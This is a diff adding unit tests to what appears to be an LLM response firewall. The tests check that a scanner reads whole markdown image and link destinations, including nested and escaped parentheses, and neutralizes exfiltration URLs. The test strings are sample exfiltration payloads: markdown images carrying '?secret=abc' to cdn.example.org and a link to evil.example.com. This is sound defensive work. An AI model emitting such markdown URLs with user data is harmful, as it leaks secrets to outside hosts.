@@ -465,3 +465,34 @@ describe('neutralizeJsonExfil', () => {
     expect(neutralizeJsonExfil(text, isExfil, scanResponseExfil(text, isExfil))).toBe('see ![c](llm-fw-blocked-exfil-url)')
   })
 })
+
+// #859: a bare markdown destination may hold balanced parentheses and
+// escaped ones (CommonMark 6.3), and a client fetches all of it. The scan
+// stopped at the first ')', so the path and query after it, where the
+// exfiltrated data sits, never reached the classifier.
+describe('markdown destinations with parentheses (#859)', () => {
+  const byQuery = (_h: string, path: string) => path.includes('secret=')
+
+  it.each([
+    ['balanced', '![x](https://cdn.example.org/p(1)?secret=abc)', 'https://cdn.example.org/p(1)?secret=abc'],
+    ['nested', '![x](https://cdn.example.org/a(b(c))?secret=abc)', 'https://cdn.example.org/a(b(c))?secret=abc'],
+    ['escaped', '![x](https://cdn.example.org/p\\)?secret=abc)', 'https://cdn.example.org/p\\)?secret=abc'],
+    ['a link', 'see [here](https://cdn.example.org/p(1)?secret=abc) now', 'https://cdn.example.org/p(1)?secret=abc'],
+    ['in angle brackets', '![x](<https://cdn.example.org/p)?secret=abc>)', 'https://cdn.example.org/p)?secret=abc'],
+  ])('reads the whole destination: %s', (_label, text, url) => {
+    const f = scanResponseExfil(text, byQuery)
+    expect(f.map(x => x.url)).toEqual([url])
+    expect(neutralizeExfil(text, f)).not.toContain('secret=')
+  })
+
+  it('still ends a destination at the unbalanced parenthesis that closes it', () => {
+    const f = scanResponseExfil('(see ![x](https://evil.example.com/a) and more)', isExfil)
+    expect(f.map(x => x.url)).toEqual(['https://evil.example.com/a'])
+  })
+
+  it('stays linear on 200 KB of open parentheses', { timeout: LINEAR_TIME_TIMEOUT }, () => {
+    const text = '![x](https://e.example/' + '('.repeat(200_000)
+    const ms = underMs(500, () => scanResponseExfil(text, isExfil))
+    expect(ms).toBeLessThan(500)
+  })
+})
